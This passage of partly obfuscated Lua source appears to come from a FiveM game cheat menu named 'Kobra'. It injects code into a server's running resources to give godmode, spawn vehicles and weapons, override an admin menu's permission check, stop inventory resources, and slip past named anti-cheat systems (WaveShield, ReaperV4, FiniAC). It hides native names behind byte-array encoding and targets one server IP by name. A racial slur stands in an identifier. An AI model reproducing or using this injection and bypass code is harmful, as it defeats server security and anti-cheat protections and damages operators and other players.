                while coroutine.status(co) ~= "dead" do
                    coroutine.resume(co)
                    Citizen.Wait(0)
                end
            ]]);else local v877=0;while true do if (v877==(142 -(96 + 46))) then v12:Notify("error","Kobra","Godmode Disabled (WaveShield)",3777 -(643 + 134) );v48(v225,[[
                if not _G.osintGodmode then _G.osintGodmode = { enabled = false, originals = {} } end
                _G.osintGodmode.enabled = false

                local function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then return end
                    if not _G.osintGodmode.originals[nativeName] then
                        _G.osintGodmode.originals[nativeName] = originalNative
                    end
                    _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                end

                hNative("SetEntityInvincible", function(originalFn, entity, toggle)
                    if _G.osintGodmode and _G.osintGodmode.enabled then
                        return originalFn(entity, true)
                    end
                    return originalFn(entity, toggle)
                end)

                local co = coroutine.create(function()
                    local ped = PlayerPedId()
                    if DoesEntityExist(ped) then SetEntityInvincible(ped, false) end
                end)
                while coroutine.status(co) ~= "dead" do
                    coroutine.resume(co)
                    Citizen.Wait(0)
                end
            ]]);break;end end end return;end if v222 then local v773=0 + 0 ;while true do if (v773==0) then v12:Notify("success","Kobra","Godmode Enabled",7193 -4193 );MachoInjectResource2(11 -8 ,"any",[[
            if not _G.osintGodmode then _G.osintGodmode = { enabled = false, originals = {} } end
            _G.osintGodmode.enabled = true

            local function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then return end
                if not _G.osintGodmode.originals[nativeName] then
                    _G.osintGodmode.originals[nativeName] = originalNative
                end
                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
            end

            hNative("SetPlayerInvincible", function(originalFn, player, toggle)
                if _G.osintGodmode and _G.osintGodmode.enabled then
                    return originalFn(player, true)
                end
                return originalFn(player, toggle)
            end)

            hNative("GetPlayerInvincible", function(originalFn, ...)
                if _G.osintGodmode and _G.osintGodmode.enabled then return true end
                return originalFn(...)
            end)

            hNative("GetPlayerInvincible_2", function(originalFn, ...)
                if _G.osintGodmode and _G.osintGodmode.enabled then return true end
                return originalFn(...)
            end)

            pcall(function() SetPlayerInvincible(PlayerId(), true) end)
        ]]);break;end end else local v774=0 + 0 ;while true do if (v774==0) then v12:Notify("error","Kobra","Godmode Disabled",3000);MachoInjectResource2(5 -2 ,"any",[[
            if not _G.osintGodmode then _G.osintGodmode = { enabled = false, originals = {} } end
            _G.osintGodmode.enabled = false

            local function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then return end
                if not _G.osintGodmode.originals[nativeName] then
                    _G.osintGodmode.originals[nativeName] = originalNative
                end
                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
            end

            hNative("SetPlayerInvincible", function(originalFn, player, toggle)
                return originalFn(player, false)
            end)

            hNative("GetPlayerInvincible", function(originalFn, ...)
                return false
            end)

            hNative("GetPlayerInvincible_2", function(originalFn, ...)
                return false
            end)

            for name, original in pairs(_G.osintGodmode.originals or {}) do
                if original and type(original) == "function" then
                    _G[name] = original
                end
            end
            _G.osintGodmode.originals = {}

            pcall(function() SetPlayerInvincible(PlayerId(), false) end)
        ]]);break;end end end break;end end end;v12.SpawnSelectedVehicle=function(v226,v227,v228,v229) if ( not v227 or (v227=="")) then return;end local v230=PlayerPedId();local v231=GetVehiclePedIsIn(v230,false);local v232=GetCurrentServerEndpoint();local v233=GetEntityCoords(v230);local v234=GetEntityHeading(v230);if (GetResourceState("solos-rentals")=="started") then local v552=0 -0 ;while true do if (v552==1) then v48("solos-rentals",string.format([[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)


            hNative("RequestModel", function(originalFn, model)
                return originalFn(model)
            end)

            hNative("HasModelLoaded", function(originalFn, model)
                return originalFn(model)
            end)

            hNative("CreateVehicle", function(originalFn, model, x, y, z, heading, networked, p6)
                return originalFn(model, x, y, z, heading, networked, p6)
            end)

            local model = "%s"
            local playerPed = PlayerPedId()
            local playerCoords = GetEntityCoords(playerPed)
            local playerHeading = GetEntityHeading(playerPed)
            config.locations["customnigga"] = {
                vehiclespawncoords = vec4(playerCoords.x, playerCoords.y, playerCoords.z, playerHeading)
            }

            if %s then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            TriggerEvent("solos-rentals:client:SpawnVehicle", model, "customnigga")

            Citizen.CreateThread(function()
                Citizen.Wait(300) -- give spawn a short moment
                if %s then
                    -- attempt to locate the spawned vehicle at the custom spawn coords, then warp player in
                    local coords = config.locations["customnigga"].vehiclespawncoords
                    local x,y,z = coords.x, coords.y, coords.z
                    local hash = GetHashKey(model)
                    local vehicle = nil
                    -- try to find a nearby vehicle with that model hash
                    for ent in EnumerateVehicles() do
                        if DoesEntityExist(ent) and GetEntityModel(ent) == hash and #(GetEntityCoords(ent) - vector3(x,y,z)) < 5.0 then
                            vehicle = ent
                            break
                        end
                    end
                    if vehicle and DoesEntityExist(vehicle) then
                        TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1)
                    end
                else
                    SetEntityCoords(PlayerPedId(), %f, %f, %f, false, false, false, false)
                    SetEntityHeading(PlayerPedId(), %f)
                end
            end)
        ]],v227,tostring(v229),tostring(v228),v233.x,v233.y,v233.z,v234));break;end if (v552==(719 -(316 + 403))) then v226:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 1)",1995 + 1005 );print("Creating Vehicle via Fallback #1");v552=2 -1 ;end end elseif (GetResourceState("amigo")=="started") then v226:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 2)",3000);print("Creating Vehicle via Fallback #2");v48("adminMenu",string.format([[
                    function hNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end

                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                    hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)

                    local model = "%s"

                    if %s then
                        DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                    end

                    local originalHasPerm = hasPerm
                    hasPerm = function(perm) return true end

                    local originalIsModelInCdimage = IsModelInCdimage
                    IsModelInCdimage = function(model) return true end

                    local veh = spawnVeh(model)
                    
                    hasPerm = originalHasPerm
                    IsModelInCdimage = originalIsModelInCdimage

                    Citizen.Wait(200)
                    if %s then
                        if veh and DoesEntityExist(veh) then
                            TaskWarpPedIntoVehicle(PlayerPedId(), veh, -1) -- fixed: use PlayerPedId + TaskWarp
                        end
                    end
                ]],v227,tostring(v229),tostring(v228)));elseif v76 then local v846=0;while true do if (v846==(0 + 0)) then v226:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 3)",7555 -4555 );print("Creating Vehicle via Fallback #3");v846=1 + 0 ;end if (v846==(1 + 0)) then v48(v76,string.format([[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)

            local model = "%s"
            local coords = GetEntityCoords(PlayerPedId())
            local heading = GetEntityHeading(PlayerPedId())

            if %s then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            ESX.Game.SpawnVehicle(model, coords, heading, function(vehicle)
                Citizen.Wait(200)
                if %s then
                    if vehicle and DoesEntityExist(vehicle) then
                        TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
                    end
                end
            end)
        ]],v227,tostring(v229),tostring(v228)));break;end end elseif (GetResourceState("qb-core")=="started") then local v969=0 -0 ;while true do if (v969==(0 -0)) then v226:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 4)",6232 -3232 );print("Creating Vehicle via Fallback #4");v969=1 + 0 ;end if (v969==1) then v48("qb-core",[[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)

            local model = "]]   .. v227   .. [["

            if ]]   .. tostring(v229)   .. [[ then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            QBCore.Functions.SpawnVehicle(model, function(veh)
                Citizen.Wait(200)
                if ]]   .. tostring(v228)   .. [[ then
                    if veh and DoesEntityExist(veh) then
                        TaskWarpPedIntoVehicle(PlayerPedId(), veh, -1) -- fixed
                    end
                else
                    SetEntityCoords(PlayerPedId(), ]]   .. v233.x   .. [[, ]]   .. v233.y   .. [[, ]]   .. v233.z   .. [[, false, false, false, false)
                    SetEntityHeading(PlayerPedId(), ]]   .. v234   .. [[)
                end
            end, GetEntityCoords(PlayerPedId()), true, true)
        ]] );break;end end elseif ((v232:match("([^:]+)")=="185.244.106.12") and (GetResourceState("drc_gardener")=="started")) then local v1077=0;while true do if (v1077==(1 -0)) then v48("drc_gardener",string.format([[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)

            local model = "%s"

            if %s then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            local ogCoords = GetEntityCoords(PlayerPedId())
            local ogHeading = GetEntityHeading(PlayerPedId())

            SpawnVehicleAndWarpPlayer(model, GetEntityCoords(PlayerPedId()))

            if not %s then
                SetEntityCoords(PlayerPedId(), ogCoords.x, ogCoords.y, ogCoords.z, false, false, false, false)
                SetEntityHeading(PlayerPedId(), ogHeading)
            end
        ]],v227,tostring(v229),tostring(v228)));break;end if (v1077==(0 + 0)) then v226:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 5)",3000);print("Creating Vehicle via Fallback #5");v1077=1;end end elseif (GetResourceState("lunar_bridge")=="started") then local v1184=0;while true do if (v1184==1) then v48("lunar_bridge",string.format([[
            local model = "%s"
            local ped = PlayerPedId()
            local coords = GetEntityCoords(ped)
            local heading = GetEntityHeading(ped)
            local offset = vector3(coords.x + math.sin(math.rad(heading)) * 3.0, coords.y + math.cos(math.rad(heading)) * 3.0, coords.z)

            if %s then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            Framework.spawnVehicle(model, offset, heading, function(vehicle)
                if not vehicle or not DoesEntityExist(vehicle) then return end
                SetVehicleOnGroundProperly(vehicle)
                Citizen.Wait(500)
                if %s then
                    TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
                end
            end)
        ]],v227,tostring(v229),tostring(v228)));break;end if (v1184==(0 -0)) then v226:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 6)",3017 -(12 + 5) );print("Creating Vehicle via Fallback #6");v1184=3 -2 ;end end elseif (GetResourceState("lation_laundering")=="started") then local v1315=0 -0 ;while true do if (v1315==(1 -0)) then v48("lation_laundering",string.format([[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)

            local function spawnVehicle()
                local model = "%s"
                local ped = PlayerPedId()
                local coords = GetEntityCoords(ped)
                local heading = GetEntityHeading(ped)
                local position = vector4(coords.x + math.sin(math.rad(heading)) * 3.0, coords.y + math.cos(math.rad(heading)) * 3.0, coords.z + 0.5, heading)
                DoScreenFadeOut(800)
                while not IsScreenFadedOut() do
                    Citizen.Wait(100)
                end
                local vehicle = SpawnVehicle(model, position)
                if not vehicle or not DoesEntityExist(vehicle) then
                    ShowNotification("~r~Error: Failed to spawn vehicle.")
                    DoScreenFadeIn(800)
                    return
                end
                SetVehicleOnGroundProperly(vehicle)
                Citizen.Wait(500)
                if %s then
                    TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
                end
                SetModelAsNoLongerNeeded(GetHashKey(model))
                DoScreenFadeIn(800)
                ShowNotification("~g~Vehicle spawned successfully!")
            end

            if %s then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            spawnVehicle()
        ]],v227,tostring(v228),tostring(v229)));break;end if (v1315==(0 -0)) then v226:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 7)",3000);print("Creating Vehicle via Fallback #7");v1315=1 + 0 ;end end else local v1316=v75();if v1316 then v226:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 8)",4973 -(1656 + 317) );print("Creating Vehicle via Fallback #8");v48(v1316,string.format([[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end

                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end

                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)

                local model = "%s"
                local ped = PlayerPedId()
                local coords = GetEntityCoords(ped)
                local heading = GetEntityHeading(ped)
                local offset = vector3(coords.x + math.sin(math.rad(heading)) * 3.0, coords.y + math.cos(math.rad(heading)) * 3.0, coords.z)

                if %s then
                    DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                end

                Framework.SpawnVehicle(function(vehicle)
                    if not vehicle or not DoesEntityExist(vehicle) then
                        return
                    end
                    SetVehicleOnGroundProperly(vehicle)
                    Citizen.Wait(500)
                    if %s then
                        TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
                    end
                end, model, offset, false)
            ]],v227,tostring(v229),tostring(v228)));elseif ((GetResourceState("monitor")=="started") or (GetResourceState("ox_lib")=="started")) then local v1464=0 + 0 ;local v1465;local v1466;local v1467;local v1468;local v1469;local v1470;local v1471;while true do if (v1464==3) then if  not v1470 then end return;end if (v1464==(0 + 0)) then v226:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 9)",3000);if ( not v227 or (v227=="")) then return;end v1465=nil;v1464=2 -1 ;end if (v1464==(9 -7)) then v1468=tostring(v228);v1469=string.format([[
        local h = function(n, f)
            local o = _G[n]
            if o and type(o) == "function" then
                _G[n] = function(...) return f(o, ...) end
            end
        end
        local d = function(t)
            local s = ""
            for i = 1, #t do s = s .. string.char(t[i]) end
            return s
        end
        local g = function(e) return _G[d(e)] end
        local w = function(ms) Citizen.Wait(ms) end

        h(d({82,101,113,117,101,115,116,77,111,100,101,108}), function(o, m) return o(m) end)
        h(d({72,97,115,77,111,100,101,108,76,111,97,100,101,100}), function(o, m) return o(m) end)
        h(d({67,114,101,97,116,101,86,101,104,105,99,108,101}), function(o, m, x, y, z, h, n, p) return o(m, x, y, z, h, n, p) end)

        local function f()
            local p = g({80,108,97,121,101,114,80,101,100,73,100})()
            local c = g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(p)
            local mn = d(%s)
            local mh = g({71,101,116,72,97,115,104,75,101,121})(mn)

            g({82,101,113,117,101,115,116,77,111,100,101,108})(mh)
            while not g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(mh) do w(0) end

            if %s then
                local cv = g({71,101,116,86,101,104,105,99,108,101,80,101,100,73,115,73,110})(p, false)
                if cv and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(cv) then
                    g({68,101,108,101,116,101,69,110,116,105,116,121})(cv)
                end
            end

            local z = c.z + 1.0
            local v = g({67,114,101,97,116,101,86,101,104,105,99,108,101})(mh, c.x, c.y, z, 0.0, true, false)

            if %s and v and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(v) then
                g({84,97,115,107,87,97,114,112,80,101,100,73,110,116,111,86,101,104,105,99,108,101})(p, v, -1)
                w(100)
            end
        end

        local co = coroutine.create(f)
        while coroutine.status(co) ~= "dead" do
            local ok = coroutine.resume(co)
            if not ok then break end
            w(0)
        end
    ]],v1466,v1467,v1468);v1470,v1471=pcall(MachoInjectResourceRaw,"monitor",v1469);v1464=3;end if (v1464==(355 -(5 + 349))) then function v1465(v1615) local v1616={};for v1643=4 -3 , #v1615 do v1616[v1643]=string.byte(v1615,v1643);end return "{"   .. table.concat(v1616,",")   .. "}" ;end v1466=v1465(v227);v1467=tostring(v229);v1464=1273 -(266 + 1005) ;end end end if (GetResourceState("lb-phone")=="started") then v226:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 10)",1977 + 1023 );print("Creating Vehicle via Fallback #10");local v1361,v1362=pcall(function() v48("lb-phone",([[
                    function hNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end

                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                    hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)

                    if %s then
                        DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                    end

                    CreateFrameworkVehicle({ vehicle = '%s' }, GetEntityCoords(PlayerPedId()))

                    if not %s then
                        SetEntityCoords(PlayerPedId(), %f, %f, %f, false, false, false, false)
                        SetEntityHeading(PlayerPedId(), %f)
                    end
                ]]):format(tostring(v229),v227,tostring(v228),v233.x,v233.y,v233.z,v234));end);if  not v1361 then end elseif (GetResourceState("qb-core")=="started") then local v1472=0;while true do if (v1472==(0 -0)) then v226:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 11)",3000);print("Creating Vehicle via Fallback #11");v1472=1;end if ((1 -0)==v1472) then v48("lb-phone",string.format([[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end

                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end

                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)

                local ped = PlayerPedId()
                local coords = GetEntityCoords(ped)
                local heading = GetEntityHeading(ped)
                local offset = vector3(coords.x + math.sin(math.rad(heading)) * 3.0, coords.y + math.cos(math.rad(heading)) * 3.0, coords.z)
                local success, err = pcall(function()
                    if %s then
                        DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                    end

                    local vehicle = CreateFrameworkVehicle({ hash = %d }, offset)
                    if not vehicle or not DoesEntityExist(vehicle) then return end
                    SetVehicleOnGroundProperly(vehicle)
                    Citizen.Wait(500)
                    if %s then
                        TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
                    end
                end)
            ]],tostring(v229),GetHashKey(v227),tostring(v228)));break;end end else return;end end end;local function v82() local v235=1696 -(561 + 1135) ;local v236;while true do if (v235==(0 -0)) then v236={"WaveShield","FiniAC"};for v715,v716 in ipairs(v236) do if (GetResourceState(v716)=="started") then return false;end end v235=1;end if (v235==1) then return GetResourceState("ReaperV4")=="started" ;end end end local function v83() local v237=0 -0 ;local v238;while true do if (v237==0) then v238={"ReaperV4","WaveShield"};for v717,v718 in ipairs(v238) do if (GetResourceState(v718)=="started") then return false;end end v237=389 -(212 + 176) ;end if (v237==1) then return GetResourceState("FiniAC")=="started" ;end end end v12.SpawnSelectedWeapon=function(v239,v240) if ( not v240 or (v240=="")) then return;end local function v241(v348) local v349={};for v553=1, #v348 do v349[v553]=string.byte(v348,v553);end return table.concat(v349,",");end local v242=v241(v240);local v243=PlayerPedId();if ( not v243 or (v243<=0)) then return;end local v244=GetHashKey(v240);if (v244==0) then return;end local v245=GetResourceState("WaveShield")=="started" ;if v245 then v239:Notify("success","Kobra","Spawned Weapon via WaveShield Bypass V2",3905 -(250 + 655) );v48(((GetResourceState("ox_lib")=="started") and "ox_lib") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,string.format([[
            if not _G.osintWeaponBypass then
                _G.osintWeaponBypass = { enabled = false }
            end
            _G.osintWeaponBypass.enabled = true

            local function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then return end
                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
            end

            hNative("GetHashKey", function(orig, str) return orig(str) end)
            hNative("GiveWeaponToPed", function(orig, ped, hash, ammo, isHidden, equipNow)
                if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                    return orig(ped, hash, ammo, false, true)
                else
                    return orig(ped, hash, ammo, isHidden, equipNow)
                end
            end)
            hNative("SetCurrentPedWeapon", function(orig, ped, hash, equipNow)
                if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                    return orig(ped, hash, true)
                else
                    return orig(ped, hash, equipNow)
                end
            end)

            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f
            end

            local function initFlow(cb)
                local co = coroutine.create(cb)
                local ok, err
                while coroutine.status(co) ~= "dead" do
                    ok, err = coroutine.resume(co)
                    if not ok then
                        print("WaveShield WeaponBypass error:", err)
                        break
                    end
                    Citizen.Wait(0)
                end
            end

            initFlow(function()
                local ped = %d
                if _g(_b("DoesEntityExist"))(ped) then
                    local weaponName = _d({%s})
                    local weaponHash = _g(_b("GetHashKey"))(weaponName)
                    if weaponHash and weaponHash ~= 0 then
                        _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
                        _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                    end
                end
            end)
        ]],v243,v242));elseif (GetResourceState("ReaperV4")=="started") then MachoResourceStop("ox_inventory");MachoResourceStop("ox_lib");v239:Notify("success","Kobra","Spawned Weapon via ReaperV4 fallback",3000);GiveWeaponToPed(v243,v244,27266 -17267 ,false,true);SetCurrentPedWeapon(v243,v244,true);Wait(436 -186 );MachoInjectResource("ReaperV4",[[
            local success = exports["ReaperV4"]:InvokeCPlayer("set", "Weapon:]]   .. v244   .. [[", true, true)
            if success then
                print("Updated Cache Successfully")
            else
                print("Failed to Update Cache")
            end
        ]] );elseif (GetResourceState("FiniAC")=="started") then local v847=0;while true do if (v847==(1 -0)) then v48(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,string.format([[
                local function _b(str)
                    local t = {}
                    for i = 1, #str do t[i] = string.byte(str, i) end
                    return t
                end

                local function _d(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end

                local function _g(n)
                    local k = _d(n)
                    local f = _G[k]
                    return f
                end

                local function _w(n)
                    return Citizen.Wait(n)
                end

                local function _s()
                    local ped = _g(_b("PlayerPedId"))()
                    local coords = _g(_b("GetEntityCoords"))(ped)
                    local weaponName = _d({%s})
                    local weaponHash = _g(_b("GetHashKey"))(weaponName)
                    if weaponHash and weaponHash ~= 0 then
                        _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
                        _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                    end
                end
                _s()
            ]],v242));break;end if (v847==(1956 -(1869 + 87))) then v239:Notify("info","Kobra","Spawned Weapon Bypass #1",3000);MachoResourceStop("ox_inventory");v847=3 -2 ;end end else v239:Notify("info","Kobra","Spawned Weapon Bypass #2",4901 -(484 + 1417) );MachoResourceStop("ox_inventory");v48(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,string.format([[
                local function _b(str)
                    local t = {}
                    for i = 1, #str do t[i] = string.byte(str, i) end
                    return t
                end

                local function _d(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end

                local function _g(n)
                    local k = _d(n)
                    local f = _G[k]
                    return f
                end

                local function _w(n)
                    return Citizen.Wait(n)
                end

                local function _s()
                    local ped = _g(_b("PlayerPedId"))()
                    local coords = _g(_b("GetEntityCoords"))(ped)
                    local weaponName = _d({%s})
                    local weaponHash = _g(_b("GetHashKey"))(weaponName)
                    if weaponHash and weaponHash ~= 0 then
                        _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
                        _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                    end
                end

                _s()
            ]],v242));end end;v12.GiveAllWeapons=function(v246) v48(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,[[
        local function _b(str)
            local t = {}
            for i = 1, #str do t[i] = string.byte(str, i) end
            return t
        end

        local function _d(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end

        local function _g(n)
            local k = _d(n)
            local f = _G[k]
            return f
        end

        local function _w(n)
            return Citizen.Wait(n)
        end

        if not _G.allWeaponsGiven then
            _G.allWeaponsGiven = true
            _G.originalWeapons = {}
            
            local weapons = {
                "WEAPON_KNIFE", "WEAPON_NIGHTSTICK", "WEAPON_HAMMER", "WEAPON_BAT", "WEAPON_CROWBAR",
                "WEAPON_GOLFCLUB", "WEAPON_BOTTLE", "WEAPON_DAGGER", "WEAPON_HATCHET", "WEAPON_KNUCKLE",
                "WEAPON_MACHETE", "WEAPON_SWITCHBLADE", "WEAPON_WRENCH", "WEAPON_BATTLEAXE", "WEAPON_POOLCUE",
                "WEAPON_STONE_HATCHET", "WEAPON_CANDYCANE", "WEAPON_ANTIQUE_CABINET", "WEAPON_BROOM",
                "WEAPON_GUSENBERG", "WEAPON_MUSKET", "WEAPON_DBSHOTGUN", "WEAPON_AUTOSHOTGUN", "WEAPON_SWEEPERSHOTGUN",
                "WEAPON_ASSAULTRIFLE", "WEAPON_CARBINERIFLE", "WEAPON_ADVANCEDRIFLE", "WEAPON_SPECIALCARBINE",
                "WEAPON_BULLPUPRIFLE", "WEAPON_COMPACTRIFLE", "WEAPON_MILITARYRIFLE", "WEAPON_HEAVYRIFLE",
                "WEAPON_TACTICALRIFLE", "WEAPON_PISTOL", "WEAPON_COMBATPISTOL", "WEAPON_APPISTOL",
                "WEAPON_PISTOL50", "WEAPON_SNSPISTOL", "WEAPON_HEAVYPISTOL", "WEAPON_VINTAGEPISTOL",
